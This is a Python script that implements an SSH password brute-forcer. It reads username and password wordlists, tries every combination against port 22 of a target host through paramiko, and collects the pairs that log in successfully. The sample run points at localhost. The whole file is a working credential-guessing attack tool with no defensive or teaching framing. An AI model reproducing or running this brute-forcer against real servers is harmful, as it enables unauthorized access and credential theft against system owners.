import queue
import socket
import threading
import time
import paramiko


# SSH爆破

class sshBruter():

    def __init__(self, host, userfile, passfile):
        self.host = host
        self.userfile = userfile
        self.passfile = passfile
        self.threadnum = 10
        self.timeout = 10
        self.result = []
        self.qlist = queue.Queue()
        self.is_exit = False
        print(self.host, self.userfile, self.passfile, self.threadnum)

    def get_queue(self):
        with open(self.userfile, 'r') as f:
            ulines = f.readlines()
        with open(self.passfile, 'r') as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + ':' + pwd)

    def thread(self):
        while not self.qlist.empty():
            if not self.is_exit:
                name, pwd = self.qlist.get().split(':')
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(hostname=self.host, port=22, username=name, password=pwd, timeout=self.timeout)
                    time.sleep(1)
                    ssh.close()
                    self.result.append({"username": name, "password": pwd})
                except socket.timeout:
                    # self.show_log(self.host, "Timeout...")
                    self.qlist.put(name + ':' + pwd)
                except Exception as e:
                    # error = "[Error] %s:%s" % (name, pwd)
                    # print(error)
                    pass
            else:
                break

    def show_result(self, lname, rlist):
        if rlist:
            print("-------------------------------------------------------------------------------------")
            for x in rlist:
                print(x)
            return {lname: rlist}
        else:
            return None

    def run(self):
        self.get_queue()
        starttime = time.time()

        self.thread()
        print(self.result)

        self.show_result(self.host, self.result)
        finishetime = time.time()
        print("Used time: %f" % (finishetime - starttime))


if __name__ == '__main__':
    x = sshBruter('127.0.0.1','../brute_dic/username.txt','../brute_dic/password.txt')
    x.run()